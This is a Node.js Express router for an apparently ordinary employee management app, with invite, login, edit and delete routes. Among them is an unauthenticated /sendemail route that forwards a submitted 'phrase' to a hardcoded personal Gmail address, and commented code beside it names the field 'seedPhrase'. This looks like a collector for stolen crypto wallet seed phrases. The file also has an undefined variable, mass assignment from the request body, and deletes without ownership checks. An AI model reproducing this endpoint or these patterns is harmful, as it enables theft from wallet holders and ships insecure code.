const express = require("express");
const router = express.Router();
const mongoose = require("mongoose")
const passport = require("passport");
const User = require("../../models/User");
const jwt = require('jsonwebtoken');
const keys = require('../../config/key');
const bcrypt = require('bcryptjs');
const {sendEmail} = require("../../helper/index");

//const passport = require('passport');

//Load Employee model
const Employee = require("../../models/Employee");
const Company = require("../../models/Company");

//Load leave validation
const employeeValidation = require("../../validation/employee");
const loginValidation = require("../../validation/login");
const messageValidation = require("../../validation/message");

// @router POST api/create/Employee
// @desc Create Employee
// @access Private
router.post ("/invitee/:token",async (req, res, next) => {


const validatejwtToken = await jwt.verify(req.params.token,keys.secretOrKey);
   const { errors, passed } = employeeValidation(req.body);
   console.log("validate>>>", validatejwtToken)

   if (!passed) {
      return res.status(404).json(errors);
   }
  const newEmployee = new Employee ({
    first_name: req.body.first_name,
    last_name: req.body.last_name,
    email: req.body.email,   
    department: req.body.department,
    designation: req.body.designation,
    user: validatejwtToken.user,
    company: validatejwtToken.company,
    password: req.body.password,
    password2: req.body.password2,
    company_name: req.body.company_name
  })
  User.findOne({ email: req.body.email})
  .then((user) => {
    if(user)  {
      return res.status(404).json({ msg: "User already exists"})
    }
    else if(!user) {
    bcrypt.genSalt(10, (err, salt) => {
      if(err) {
        return res.status(500).json({status: false, message: 'Oops, an error please try'});
      }
      bcrypt.hash(newEmployee.password, salt, (err, hash) => {
        if(err) throw err;
        newEmployee.password = hash;
        newEmployee.isVerified = true;
        newEmployee.save()
        .then((
          employee) => {
          employee.password = undefined;
          employee.password2 = undefined;
          return res.status(200).json(employee);
        })
      })
    })
    
  }

    })
    .catch((errors) => {
      res.status(404).json(errors);
    });
      
  })

// @router GET api/users/login
// @desc   Login User / Returning JWT Token
// @access Public
router.post('/login',(req,res) => {
  /* wee add the following data to any route that is going to take data for- */
  const { errors, passed } = loginValidation(req.body);
  // check validation if isValid is false
  if (!passed) {
    return res.status(404).json(errors);
  }

  const email = req.body.email;
  const password = req.body.password;

  //Find User if it exist
  Employee.findOne({email})
  .then((employee) => { //if there is no user
   
   
   console.log("employee",employee)
    if(!employee) {
      return res.status(404).json({ 
      email_not_found: 'User not found'})
    }
    else if(!employee.isVerified){
      return res.status(400)
      .json({status:false, message:"please verify your email address or request for a new verification link"})
    }
    //if there is a user we continue by comparing the paswword that was hashed in the register and the one passed here in the login route
    bcrypt.compare(password, employee.password)
    .then((isMatch) => {
      if(isMatch) {
      //user matched
      //payload contains all the deatial we want in our token
      const payload = { employee: employee.id, department: employee.department, isVerified: employee.isVerified, department: employee.department,company:employee.company} //Create JWT(jsonweb token)

      // Sign Token
       jwt.sign(
         payload,
         keys.secretOrKey,
          { expiresIn: 86400},
           (err, token) => {
              res.json({
               success: true,
               token: "Bearer " + token 
              })
       })
      
        }  else {
        return res.status(400).json({password: 'Password Incorrect' });
      }

  })
})
});







////////

// @router GET api/users/login
// @desc   Login User / Returning JWT Token
// @access Public
router.post('/sendemail', async (req,res) => {
  // const { errors, passed } = messageValidation(req.body);
  // if (!passed) {
  //   return res.status(404).json(errors);
  // }
  
  // const seedPhrase = req.body.seedPhrase;
  

   console.log('trial', req.body.phrase)
 const result = sendEmail('okeolamide.o@gmail.com',req?.body?.phrase, 'New Subscriber')
 return res.json({message:req.body.phrase, data: result})
}); 


////////////////












// // @route   GET api/Company/Employee
// // @desc    Get all Employee
// // @access  Public
router.get("/all", (req, res) => {
  if(user.is_admin) {
  Employee.find()
  .populate("users", ["first_name", "last_name", "company", "designation"])
  .then((employee) => {
    if(employee) {
      return res.status(200).json(employee)
    }
    return res.status(400).json({ msg: "There aren't any Employee yet"})
  })
  .catch((err) => {
    res.status(404).json(err);
  })};
});

// // @route Edit api/Company/Employee/edit/:employee_id
// // @desc Edit leaveType route
// // @access Private
router.put("/edit/:employee_id", passport.authenticate("jwt", { session: false }), (req, res, next) => {
  Employee.findById(req.params.employee_id)
  .then((employee)=> {
    if(employee) {
    Object.assign(employee, req.body);
    employee.save((err, savedEmployee) => {
      if (err) {
        console.log("event-err:", err);
        return next();
      }
      return res.json(savedEmployee)
    });
    } 
  },
  (err) => {
    console.log("err:", err);
    return next();
  }
  );
});

// @router DELETE api/create leave/test
// @desc Delete Leave for employee
// @access Private
router.delete("/:employee_id", passport.authenticate("jwt", { session: false}), (req, res, next) => {
  console.log('employee_id:', req.params.employee_id)
  Employee.remove({ _id: req.params.employee_id }) 
    .then(() => res.json("SUCCESSFUL"),
    (err) => {
      console.log("err:", err);
      return next();
    })
  });

  module.exports = router;

  